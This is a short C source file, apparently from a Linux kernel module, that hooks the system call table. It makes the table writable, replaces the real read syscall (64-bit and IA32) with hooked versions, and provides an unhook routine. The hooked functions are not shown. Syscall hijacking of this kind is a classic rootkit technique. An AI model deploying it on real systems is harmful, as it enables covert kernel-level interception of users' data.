#include "hookfns.h"

/*****************************************************************************\
| This is where the magic happens. We call HOOK (and maybe HOOK_IA32) for     |
| each syscall.                                                               |
| The macros HOOK and HOOK_IA32 replace the REAL functions with the FAKE      |
| ones. See syshijack.h for more info.                                        |
\*****************************************************************************/

void hook_calls(void){
	if(get_sct() && set_sct_rw()){

/* __NR_read / __NR32_read */
		HOOK(__NR_read, real_sys_read, hooked_sys_read);
#ifdef __NR32_read
		HOOK_IA32(__NR32_read, real_sys_read32, hooked_sys_read32);
#endif

		set_sct_ro();
	}
}

/*****************************************************************************\
|                                      END                                    |
\*****************************************************************************/


/*****************************************************************************\
| This is where we restore the REAL functions, aka, undo what HOOK and        |
| HOOK_IA32 did.                                                              |
\*****************************************************************************/

void unhook_calls(void){
	if(get_sct() && set_sct_rw()){

/* __NR_read / __NR_read32 */
		UNHOOK(__NR_read, real_sys_read);
#ifdef __NR32_read
		UNHOOK_IA32(__NR32_read, real_sys_read32);
#endif

		set_sct_ro();
	}
}

/*****************************************************************************\
|                                      END                                    |
\*****************************************************************************/